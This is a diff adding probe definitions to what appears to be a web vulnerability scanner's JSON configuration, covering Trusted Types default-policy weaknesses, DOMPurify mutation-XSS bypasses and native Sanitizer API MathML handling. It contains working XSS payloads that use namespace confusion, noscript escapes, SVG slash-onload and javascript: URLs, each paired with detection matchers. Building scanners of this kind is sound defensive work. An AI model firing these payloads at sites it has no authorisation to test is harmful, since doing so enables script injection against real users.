@@ -98,6 +98,86 @@
           "confidence_boost": 40
         }
       ]
+    },
+    "trusted_types_default_policy": {
+      "description": "Trusted Types (TT) require sinks to receive TrustedHTML/TrustedScript objects. Apps create a 'default' policy that serves as a last-line sanitizer. If attacker can hijack default policy creation (e.g. early <script> injection in pre-TT region), they bypass TT enforcement.",
+      "tech_match": ["trusted_types", "csp"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Detect Trusted Types in CSP / HTML. Look for `Content-Security-Policy: ... require-trusted-types-for 'script'` or `trustedTypes.createPolicy(`.",
+          "matchers": [
+            {"type": "header", "name": "Content-Security-Policy", "contains": "trusted-types"},
+            {"type": "regex", "pattern": "trustedTypes\\.createPolicy"}
+          ],
+          "severity": "low",
+          "confidence_boost": 25
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "Find default policy. If `createPolicy('default', ...)` exists, inspect createHTML/createScript implementations. Pass-through (returns input unchanged) defeats TT entirely.",
+          "matchers": [
+            {"type": "regex", "pattern": "createPolicy\\s*\\(\\s*['\\\"]default['\\\"]"}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "dompurify_mutation_xss": {
+      "description": "DOMPurify versions <3.0.5 had multiple mutation-XSS bypasses. Specific MathML / SVG namespaced elements re-parse after sanitization, mutating into XSS-executing markup. 2024-2025 research continues to find variants in Angular / React integrations.",
+      "tech_match": ["dompurify", "sanitizer"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
+          "description": "DOMPurify mutation XSS — namespace confusion across math/svg/html. After sanitization the browser re-parses and `onerror` becomes attribute on img.",
+          "matchers": [
+            {"type": "reflection"},
+            {"type": "word", "any": ["<img", "onerror"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "<noscript><p title=\"</noscript><img src onerror=alert(1)>\">",
+          "description": "noscript-context confusion — browser parses inside noscript when JS enabled differently than DOMPurify expects.",
+          "matchers": [
+            {"type": "reflection"},
+            {"type": "word", "any": ["onerror", "<img"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "<svg><g/onload=alert(1)//<p>",
+          "description": "SVG self-closing handler — old DOMPurify variants miss the slash-attribute trick.",
+          "matchers": [
+            {"type": "reflection"},
+            {"type": "word", "any": ["onload", "<svg"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "sanitizer_api_namespace_drift": {
+      "description": "The native Sanitizer API (Element.setHTML, Document.parseHTMLUnsafe) has different default allowlists than DOMPurify. Apps relying on Sanitizer API may allow MathML / SVG elements that re-parse to XSS in some browsers.",
+      "tech_match": ["sanitizer_api"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "<math><mi xlink:href=\"javascript:alert(1)\">click</mi></math>",
+          "description": "MathML xlink:href javascript: — Sanitizer API may allow xlink in MathML namespace by default.",
+          "matchers": [
+            {"type": "reflection"},
+            {"type": "word", "any": ["xlink", "javascript:"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
     }
   }
 }
